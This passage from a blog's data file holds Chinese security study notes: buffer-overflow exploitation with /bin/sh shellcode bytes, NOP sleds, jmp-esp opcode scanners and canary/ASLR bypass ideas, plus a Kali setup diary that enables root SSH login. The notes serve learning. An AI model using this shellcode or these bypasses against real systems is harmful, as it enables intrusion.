语法没有相应的东西要加</td>\n</tr>\n</tbody></table>\n<p><strong>gdb</strong></p>\n<p><strong>gdb指令（短/长）</strong></p>\n<ul>\n<li><p>r/run, c/continue</p>\n</li>\n<li><p>s/step, n/next</p>\n</li>\n<li><p>si, ni</p>\n</li>\n<li><p>b/break</p>\n</li>\n<li><p>bt/backtrace</p>\n</li>\n<li><p>x, print, display,     info</p>\n</li>\n<li><p>…</p>\n</li>\n<li><p>Breakpoints: stops     when executed </p>\n</li>\n<li><ul>\n<li>break function</li>\n<li>break *addr</li>\n<li>info break</li>\n<li>clear function</li>\n<li>delete/enable/disable      [n]</li>\n</ul>\n</li>\n<li><p>Watchpoints: stops     when values changed </p>\n</li>\n<li><ul>\n<li>watch expr</li>\n<li>info watch</li>\n</ul>\n</li>\n<li><p>continue</p>\n</li>\n<li><p>step：     向前移动一步（语句），在调用函数时进入被调用者</p>\n</li>\n<li><p>stepi：    向前移动一步（指令），在调用函数时进入被调用者</p>\n</li>\n<li><p>next：     向前移动一步（语句），在调用函数时跳过被调用者</p>\n</li>\n<li><p>nexti：    向前移动一步（指令），在调用函数时跳过被调用者</p>\n</li>\n<li><p>print [/f] expr</p>\n</li>\n<li><ol>\n<li>x      十六进制</li>\n<li>d      有符号十进制</li>\n<li>u      无符号十进制</li>\n<li>o      八进制</li>\n<li>t       二进制</li>\n<li>a      地址</li>\n<li>c      character</li>\n<li>f       浮点数</li>\n</ol>\n</li>\n<li><p>info reg [rn]</p>\n</li>\n<li><p>Display </p>\n</li>\n<li><ul>\n<li><p>x [/Nuf] expr </p>\n</li>\n<li><ul>\n<li><p>N count of units       to display</p>\n</li>\n<li><p>u unit size </p>\n</li>\n<li><ul>\n<li>b 字节</li>\n<li>h 双字</li>\n<li>w 四字</li>\n<li>g 八字节</li>\n</ul>\n</li>\n<li><p>f printing format       </p>\n</li>\n<li><ul>\n<li>s 空字符结束的字符串</li>\n<li>i 汇编指令</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>disassem [addr]</p>\n</li>\n</ul>\n</li>\n</ul>\n<p><strong>链接过程</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625161620552.png\" alt=\"image-20210625161620552\" style=\"zoom:20%;\" />\n\n<p><strong>文件格式</strong></p>\n<ul>\n<li><p>文件类型识别 </p>\n</li>\n<li><ul>\n<li>file命令</li>\n<li>文件magic</li>\n<li>binwalk项目，参考ReFirmLabs/binwalk</li>\n</ul>\n</li>\n<li><p>文件检查 </p>\n</li>\n<li><ul>\n<li>md5sum，校验文件md5值</li>\n<li>virustotal,识别恶意代码</li>\n<li>fuzzy hashing: ssdeep fuzzywuzzy</li>\n<li>diff/patch</li>\n</ul>\n</li>\n<li><p>ELF/PE/Mach-O </p>\n</li>\n<li><ul>\n<li>readelf命令</li>\n<li>peview/loard-pe/等</li>\n</ul>\n</li>\n</ul>\n<p><strong>ELF文件格式</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625161817046.png\" alt=\"image-20210625161817046\" style=\"zoom: 33%;\" />\n\n<p><strong>PE文件格式</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625161921562.png\" alt=\"image-20210625161921562\" style=\"zoom:33%;\" />\n\n<p><strong>如何利用缓冲区溢出</strong></p>\n<ul>\n<li><p>覆盖局部变量 </p>\n</li>\n<li><ul>\n<li>尤其是函数指针</li>\n</ul>\n</li>\n<li><p>覆盖错误句柄</p>\n</li>\n<li><p>覆盖存储在栈帧上的指针</p>\n</li>\n<li><p>覆盖返回地址 </p>\n</li>\n<li><ul>\n<li>当函数返回时改变EIP</li>\n</ul>\n</li>\n</ul>\n<p><strong>shellcode开发</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *name[<span class=\"number\">2</span>];</span><br><span class=\"line\">    name[<span class=\"number\">0</span>] = <span class=\"string\">&quot;/bin/sh&quot;</span>;</span><br><span class=\"line\">    name[<span class=\"number\">1</span>] = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    execve(name[<span class=\"number\">0</span>],name,<span class=\"literal\">NULL</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>如何利用缓冲区溢出</strong></p>\n<p>把指令和数据改为字符串形式</p>\n<p>“\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x46<br> \\x0c\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c<br> xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\\x80\\xe8\\xdc\\x<br> ff\\xff\\xff/bin/sh”</p>\n<p><strong>shellcode开发</strong></p>\n<p>编写汇编程序</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">section .text</span><br><span class=\"line\">global _start</span><br><span class=\"line\">_start:</span><br><span class=\"line\">xor eax,eax</span><br><span class=\"line\">push eax</span><br><span class=\"line\">push 0x68732f2f</span><br><span class=\"line\">push 0x6e69622f</span><br><span class=\"line\">mov ebx,esp</span><br><span class=\"line\">push eax</span><br><span class=\"line\">push ebx</span><br><span class=\"line\">mov ecx,esp</span><br><span class=\"line\">xor edx,edx</span><br><span class=\"line\">mov al,0xb</span><br><span class=\"line\">int 0x80</span><br></pre></td></tr></table></figure>\n\n<p>编译并获取机器码</p>\n<p>char shellcode[]=”\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80”;</p>\n<ul>\n<li><p>不是所有的字符都能作为shellcode     </p>\n</li>\n<li><ul>\n<li>gets():遇到换行符就停止</li>\n<li>strcpy():遇到NULL就停止</li>\n<li>…</li>\n</ul>\n</li>\n<li><p>shellcode需要做相应的调整 </p>\n</li>\n<li><ul>\n<li>删除 \\x00,空格，换行符…</li>\n<li>删除不能被打印的字符</li>\n</ul>\n</li>\n</ul>\n<p><strong>基础栈溢出</strong></p>\n<ul>\n<li><p>覆盖返回地址，shellcode位与栈上     </p>\n</li>\n<li><ul>\n<li>问题：攻击者如何精确定位shellcode的地址</li>\n<li>解决：NOP slide</li>\n</ul>\n</li>\n<li><p>猜测大概的栈地址</p>\n</li>\n<li><p>在shellcode前面填充大量NOPs</p>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625164034717.png\" alt=\"image-20210625164034717\" style=\"zoom:35%;\" />\n\n<ul>\n<li><p>覆盖返回地址，shellcode位与栈上     </p>\n</li>\n<li><ul>\n<li>问题：如果buffer长度小于shellcode长度</li>\n<li>解决：RNS模式</li>\n</ul>\n</li>\n<li><p>把shellcode放在内存的高位上（调用者的栈帧）</p>\n</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625164102489.png\" alt=\"image-20210625164102489\" style=\"zoom:33%;\" />\n\n<p><strong>关于字符串的危险库函数</strong></p>\n<ul>\n<li>strcpy (char *dest,     const char *src)</li>\n<li>strcat (char *dest,     const char *src)</li>\n<li>gets (char *s)</li>\n<li>scanf ( const char     *format, … )</li>\n<li>…</li>\n</ul>\n<p><strong>基础栈溢出的问题</strong></p>\n<ul>\n<li>依赖缓冲区/栈的地址，栈的地址会根据平台和每次运行而改变。</li>\n<li>如何构造一个适用于大多数平台的攻击？</li>\n</ul>\n<p><strong>jmp esp</strong></p>\n<ul>\n<li>寻找指令”jmp     esp”的地址</li>\n<li>不需要知道shellcode的地址</li>\n</ul>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625164339018.png\" alt=\"image-20210625164339018\" style=\"zoom:33%;\" />\n\n<p><strong>到哪里寻找 “jmp esp”</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span>,<span class=\"keyword\">char</span>**,<span class=\"keyword\">char</span>**)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tBYTE* pbyte;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> nPos=<span class=\"number\">0</span>,nAddr=<span class=\"number\">0</span>;</span><br><span class=\"line\">\tHINSTANCE hHinst=<span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">bool</span> bTips=<span class=\"literal\">true</span>;</span><br><span class=\"line\">\thHinst=LoadLibrary(<span class=\"string\">&quot;user32.dll&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!hHinst) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\tpbyte=(BYTE*)hHinst;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(bTips)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(pbyte[nPos]==<span class=\"number\">0xff</span> &amp;&amp; pbyte[nPos+<span class=\"number\">1</span>]==<span class=\"number\">0xe4</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tnAddr=(<span class=\"keyword\">int</span>)pbyte+nPos;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;address is 0x%x\\n&quot;</span>,nAddr);</span><br><span class=\"line\">\t\t\tbTips=<span class=\"literal\">false</span>;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">         <span class=\"keyword\">else</span></span><br><span class=\"line\">           nPos++;</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">     <span class=\"keyword\">if</span>(hHinst!=<span class=\"literal\">NULL</span>) FreeLibrary(hHinst);</span><br><span class=\"line\">     <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;tchar.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">int</span> nRetCode=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">bool</span> we_load_it=<span class=\"literal\">false</span>;</span><br><span class=\"line\">HINSTANCE h;</span><br><span class=\"line\">TCHAR dllname[]=_T(<span class=\"string\">&quot;ntdll&quot;</span>);       </span><br><span class=\"line\">h=<span class=\"built_in\">GetModuleHandle</span>(dllname);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(h==<span class=\"literal\">NULL</span>)</span><br><span class=\"line\">  &#123;h=<span class=\"built_in\">LoadLibrary</span>(dllname);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(h==<span class=\"literal\">NULL</span>)</span><br><span class=\"line\"> &#123;cout&lt;&lt;<span class=\"string\">&quot;ERROR LOADING DLL:&quot;</span>&lt;&lt;dllname&lt;&lt;endl;</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">we_load_it=<span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">BYTE* ptr=(BYTE*)h;</span><br><span class=\"line\"><span class=\"keyword\">bool</span> done=<span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> y=<span class=\"number\">0</span>;!done;y++)</span><br><span class=\"line\">&#123;<span class=\"keyword\">try</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(ptr[y]==<span class=\"number\">0xFF</span>&amp;&amp;ptr[y+<span class=\"number\">1</span>]==<span class=\"number\">0xE4</span>)</span><br><span class=\"line\">&#123;<span class=\"keyword\">int</span> pos=(<span class=\"keyword\">int</span>)ptr+y;</span><br><span class=\"line\">cout&lt;&lt;<span class=\"string\">&quot;OPCODE found at 0x&quot;</span>&lt;&lt;hex&lt;&lt;pos&lt;&lt;endl;&#125;&#125;</span><br><span class=\"line\"><span class=\"built_in\"><span class=\"keyword\">catch</span></span>(...)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">cout&lt;&lt;<span class=\"string\">&quot;END OF&quot;</span>&lt;&lt;dllname&lt;&lt;<span class=\"string\">&quot;MEMORY REACHED&quot;</span>&lt;&lt;endl;</span><br><span class=\"line\">done=<span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(we_load_it)</span><br><span class=\"line\"><span class=\"built_in\">FreeLibrary</span>(h);</span><br><span class=\"line\"><span class=\"keyword\">return</span> nRetCode;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;tchar.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">int</span> nRetCode=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">bool</span> we_load_it=<span class=\"literal\">false</span>;</span><br><span class=\"line\">HINSTANCE h;</span><br><span class=\"line\">TCHAR dllname[]=_T(<span class=\"string\">&quot;ntdll&quot;</span>);       </span><br><span class=\"line\">h=<span class=\"built_in\">GetModuleHandle</span>(dllname);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(h==<span class=\"literal\">NULL</span>)</span><br><span class=\"line\">  &#123;h=<span class=\"built_in\">LoadLibrary</span>(dllname);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(h==<span class=\"literal\">NULL</span>)</span><br><span class=\"line\"> &#123;cout&lt;&lt;<span class=\"string\">&quot;ERROR LOADING DLL:&quot;</span>&lt;&lt;dllname&lt;&lt;endl;</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">we_load_it=<span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">BYTE* ptr=(BYTE*)h;</span><br><span class=\"line\"><span class=\"keyword\">bool</span> done=<span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> y=<span class=\"number\">0</span>;!done;y++)</span><br><span class=\"line\">&#123;<span class=\"keyword\">try</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(ptr[y]==<span class=\"number\">0xFF</span>&amp;&amp;ptr[y+<span class=\"number\">1</span>]==<span class=\"number\">0xE4</span>)</span><br><span class=\"line\">&#123;<span class=\"keyword\">int</span> pos=(<span class=\"keyword\">int</span>)ptr+y;</span><br><span class=\"line\">cout&lt;&lt;<span class=\"string\">&quot;OPCODE found at 0x&quot;</span>&lt;&lt;hex&lt;&lt;pos&lt;&lt;endl;&#125;&#125;</span><br><span class=\"line\"><span class=\"built_in\"><span class=\"keyword\">catch</span></span>(...)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">cout&lt;&lt;<span class=\"string\">&quot;END OF&quot;</span>&lt;&lt;dllname&lt;&lt;<span class=\"string\">&quot;MEMORY REACHED&quot;</span>&lt;&lt;endl;</span><br><span class=\"line\">done=<span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(we_load_it)</span><br><span class=\"line\"><span class=\"built_in\">FreeLibrary</span>(h);</span><br><span class=\"line\"><span class=\"keyword\">return</span> nRetCode;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>不知道哪个能用&gt;(●’◡’●)&lt;</p>\n<p><strong>ASLR和PIE</strong></p>\n<p>地址址空间配置随机化（英语：Address space layout randomization，缩写ASLR，又称位址空间配置随机化、位址空间布局随机化）它是一种防范内存损坏漏洞被利用的计算机安全技术。位址空间配置随机载入利用随机方式配置资料定址空间，使某些敏感资料（例如作业系统内核）配置到一个恶意程式无法事先获知的位址，令攻击者难以进行攻击。</p>\n<ul>\n<li>程序每次执行的地址和libc的地址都会随机变化</li>\n<li>使用固定地址的”jmp esp== ‘\\xff\\xe4’ “攻击失效</li>\n</ul>\n<p><strong>应对手段</strong></p>\n<p><strong>泄漏libc基地址</strong></p>\n<p>即使开启地址随机化，也不是全随机的。对于linux来说，开启ASLR，libc的基地址在每一次启动时都会变化，但是libc本身是整块存入内存的。即libc中指令相对于其基地址的偏移是不会变化的。而libc本身的指令是足够getshell的，所以要对抗ASLR，可以从泄露libc基地址下手。</p>\n<p><strong>stack cookies</strong></p>\n<p>Canary</p>\n<p>在缓冲区和返回地址之间插入一个cookie，函数返回时会检查其是否被修改，如果与插入时的值不一致，则认为发生了缓冲区溢出。</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210625170722345.png\" alt=\"image-20210625170722345\" style=\"zoom:33%;\" />\n\n<ul>\n<li><p>绕过手段 </p>\n</li>\n<li><ul>\n<li>通过信息泄漏漏洞获取cookie</li>\n<li>使用不会覆盖cookie的漏洞</li>\n<li>覆盖其他敏感数据而不是返回地址</li>\n</ul>\n</li>\n</ul>\n<p><strong>影子栈-StackShield</strong></p>\n<ul>\n<li>把正确的返回地址保存在一个攻击者难以接触的地方</li>\n<li>函数返回时把当前返回地址和保存的返回地址比较</li>\n</ul>\n<p>在函数开始是保存RET，在函数返回时比较。</p>\n<ul>\n<li><p>优势 </p>\n</li>\n<li><ul>\n<li>返回地址难以覆盖</li>\n</ul>\n</li>\n<li><p>劣势 </p>\n</li>\n<li><ul>\n<li>高性能开销</li>\n<li>保存的返回地址需要被保护</li>\n<li>兼容性问题</li>\n</ul>\n</li>\n</ul>\n"},{"_content":"```\nkali学习日记\n```\n\n开机操作O(∩_∩)O\n\n\n\n```\nsudo passwd root 设置密码\nsu root \npwd\nsu -root\nsudo -i\n```\n\n```\necho $SHELL(/usr/bin/zsh) ---记录当前shell(bash/zsh)\n```\n\n配镜像源\n\n```\nvim /etc/apt/sources.list\n```\n\n```\n(vim):set nu\n```\n\n中科大镜像源\n\n```shell\ndeb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\n```\n\n\n\n```\ndeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\n```\n\n复制粘贴kali:选中+滚轮\n\ndeb 代表软件的位置 deb-src 代表源代码所在的位置\n\n```\nwindows .exe .zip .rar\n\nlinux .rpm  .tar.gz .deb\n```\n\n更新前apt update\n\nkali 的 apt 源\n\nKali Rolling :是kali即时更新版，只要kali中有更新，更新包就会放入Kali Rolling中\n\n在kali rolling 下有三类软件包 main 、non-free、contrib;\n\n| dists区域 | 软件包组件标准                                          |\n| --------- | ------------------------------------------------------- |\n| main      | 遵从Debian 自由软件指导方针(DFSG)，并且不依赖于non-free |\n| contrib   | 遵从Debian 自由软件指导方针(DFSG)，但依赖于non-free     |\n| non-free  | 不遵从Debian 自由软件指导方针(DFSG)                     |\n\napt  apt-get  包含关系\n\napt常用命令：\n\n```\napt install  安装软件包\napt remove  移除软件包\napt update  更新可用软件包列表\napt upgrade  通过 安装/升级 软件来更新系统\napt dist-upgrade (有风险)带卸载的更新\nvim /etc/apt/sources.list 编辑软件源信息文件\n```\n\ninit 0 关机\n\nifconfig \n\nifconfig eth0 192.168.1.53/24(子网掩码255.255.255.0)   配置临时ip\n\nroute add default gw 192.168.1.1       配置默认路由\n\nping 192.168.1.1\n\nvim /etc/resolv.conf\n\necho nameserver 8.8.8.8 >/etc/resolv.conf    配置dns服务\n\n永久搞一个ip\n\nvim /etc/network/interfaces\n\n添加：\n\n```\nauto eth0\n\n#iface eth0 inet dhcp\n\niface eth0 inet static     静态地址\n\naddress 192.168.1.53\t   固定IP地址\n\nnetmask 255.255.255.0      子网掩码\n\ngateway 192.168.1.1        网关\n```\n\n机器\n\n```\nkali xp win10/7 centos7 靶机\n```\n\n重启网络服务\n\n /etc/init.d/networking                             /etc/init.d/networking restart\n\nsystemctl  restart networking                 systemctl  restart networking.service        \n\nvim /etc/ssh/sshd_config\n\n找#Authentication:\n\n第二行  PermitRootLogin yes\n\n三行后 PubkeyAuthentication yes\n\n /etc/init.d/ssh restart     /  systemctl  restart  ssh\n\nupdate -rc.d ssh enable\n\n\n\nxshell 连接 \n\n传文件 yum install lrzsz-y\n\napt install lrzsz\n\nrz 上传\n\nsz 下载\n\n搬瓦工\n\n国外vps服务器\n\n350https://bwh81.net/cart.php\n\n*** 利用第三方服务对目标进行被动信息收集，防止被发现","source":"_posts/kali_1.md","raw":"```\nkali学习日记\n```\n\n开机操作O(∩_∩)O\n\n\n\n```\nsudo passwd root 设置密码\nsu root \npwd\nsu -root\nsudo -i\n```\n\n```\necho $SHELL(/usr/bin/zsh) ---记录当前shell(bash/zsh)\n```\n\n配镜像源\n\n```\nvim /etc/apt/sources.list\n```\n\n```\n(vim):set nu\n```\n\n中科大镜像源\n\n```shell\ndeb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\n```\n\n\n\n```\ndeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\n```\n\n复制粘贴kali:选中+滚轮\n\ndeb 代表软件的位置 deb-src 代表源代码所在的位置\n\n```\nwindows .exe .zip .rar\n\nlinux .rpm  .tar.gz .deb\n```\n\n更新前apt update\n\nkali 的 apt 源\n\nKali Rolling :是kali即时更新版，只要kali中有更新，更新包就会放入Kali Rolling中\n\n在kali rolling 下有三类软件包 main 、non-free、contrib;\n\n| dists区域 | 软件包组件标准                                          |\n| --------- | ------------------------------------------------------- |\n| main      | 遵从Debian 自由软件指导方针(DFSG)，并且不依赖于non-free |\n| contrib   | 遵从Debian 自由软件指导方针(DFSG)，但依赖于non-free     |\n| non-free  | 不遵从Debian 自由软件指导方针(DFSG)                     |\n\napt  apt-get  包含关系\n\napt常用命令：\n\n```\napt install  安装软件包\napt remove  移除软件包\napt update  更新可用软件包列表\napt upgrade  通过 安装/升级 软件来更新系统\napt dist-upgrade (有风险)带卸载的更新\nvim /etc/apt/sources.list 编辑软件源信息文件\n```\n\ninit 0 关机\n\nifconfig \n\nifconfig eth0 192.168.1.53/24(子网掩码255.255.255.0)   配置临时ip\n\nroute add default gw 192.168.1.1       配置默认路由\n\nping 192.168.1.1\n\nvim /etc/resolv.conf\n\necho nameserver 8.8.8.8 >/etc/resolv.conf    配置dns服务\n\n永久搞一个ip\n\nvim /etc/network/interfaces\n\n添加：\n\n```\nauto eth0\n\n#iface eth0 inet dhcp\n\niface eth0 inet static     静态地址\n\naddress 192.168.1.53\t   固定IP地址\n\nnetmask 255.255.255.0      子网掩码\n\ngateway 192.168.1.1        网关\n```\n\n机器\n\n```\nkali xp win10/7 centos7 靶机\n```\n\n重启网络服务\n\n /etc/init.d/networking                             /etc/init.d/networking restart\n\nsystemctl  restart networking                 systemctl  restart networking.service        \n\nvim /etc/ssh/sshd_config\n\n找#Authentication:\n\n第二行  PermitRootLogin yes\n\n三行后 PubkeyAuthentication yes\n\n /etc/init.d/ssh restart     /  systemctl  restart  ssh\n\nupdate -rc.d ssh enable\n\n\n\nxshell 连接 \n\n传文件 yum install lrzsz-y\n\napt install lrzsz\n\nrz 上传\n\nsz 下载\n\n搬瓦工\n\n国外vps服务器\n\n350https://bwh81.net/cart.php\n\n*** 利用第三方服务对目标进行被动信息收集，防止被发现","slug":"kali_1","published":1,"date":"2021-07-07T08:15:14.237Z","updated":"2021-07-07T17:22:10.742Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cksan4n9a0003rouv8ujxafyt","content":"<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kali学习日记</span><br></pre></td></tr></table></figure>\n\n<p>开机操作O(∩_∩)O</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo passwd root 设置密码</span><br><span class=\"line\">su root </span><br><span class=\"line\">pwd</span><br><span class=\"line\">su -root</span><br><span class=\"line\">sudo -i</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo $SHELL(/usr/bin/zsh) 